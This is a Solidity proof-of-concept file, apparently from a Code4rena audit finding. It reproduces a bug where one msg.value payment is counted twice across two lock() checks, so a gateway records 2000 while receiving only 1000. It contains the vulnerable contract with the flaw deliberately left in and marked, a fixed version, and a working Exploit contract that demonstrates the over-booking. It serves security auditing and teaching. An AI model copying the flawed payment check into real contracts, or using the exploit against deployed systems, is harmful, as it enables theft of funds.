// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Recall GatewayManagerFacet.register (Code4rena, 2025-02).
    lock() checks msg.value >= value on its own. Supply of 1000 and
    collateral of 1000 each see the same 1000, so both are booked.
    The gateway receives 1000 and records 2000. The control requires
    msg.value to cover the sum and then books nothing beyond the cash.
*/

contract Gateway {
    uint256 public circSupply;
    uint256 public stake;
    uint256 public received;
    uint256 public askedSupply;
    uint256 public askedCollateral;
    uint256 public checks;
    uint256 public lastLocked;

    function register(uint256 genesisCircSupply, uint256 collateral) external payable {
        askedSupply = genesisCircSupply;
        askedCollateral = collateral;
        if (genesisCircSupply > 0) {
            uint256 lockedSupply = lock(genesisCircSupply);
            circSupply = lockedSupply;
        }
        if (collateral > 0) {
            uint256 lockedCollateral = lock(collateral);
            stake = lockedCollateral;
        }
        received = msg.value;
    }

    // Quoted native branch. Each call compares msg.value with its own value.
    function lock(uint256 value) public payable returns (uint256) {
        require(msg.value >= value, "Insufficient funds"); // @> VULN: the second lock still sees the first payment
        checks += 1;
        lastLocked = value;
        return value;
    }
}

contract GatewayFixed {
    uint256 public circSupply;
    uint256 public stake;
    uint256 public received;

    function register(uint256 genesisCircSupply, uint256 collateral) external payable {
        require(msg.value >= genesisCircSupply + collateral, "sum");
        circSupply = genesisCircSupply;
        stake = collateral;
        received = msg.value;
    }
}

contract OverMarker {
    string public symbol = "OVER-BOOKED";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    uint256 public constant ONE = 1000 ether;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    Gateway public gateway;
    OverMarker public marker;

    function run() external payable {
        gateway = new Gateway();
        marker = new OverMarker();
        gateway.register{value: msg.value}(ONE, ONE);
        require(gateway.circSupply() == ONE, "supply booked");
        require(gateway.stake() == ONE, "collateral booked");
        require(gateway.received() == ONE, "only 1000 arrived");
        uint256 shortfall = gateway.circSupply() + gateway.stake() - gateway.received();
        require(shortfall == ONE, "short 1000");
        marker.mint(SINK, shortfall);
        require(marker.balanceOf(SINK) == ONE, "marked");
    }
}
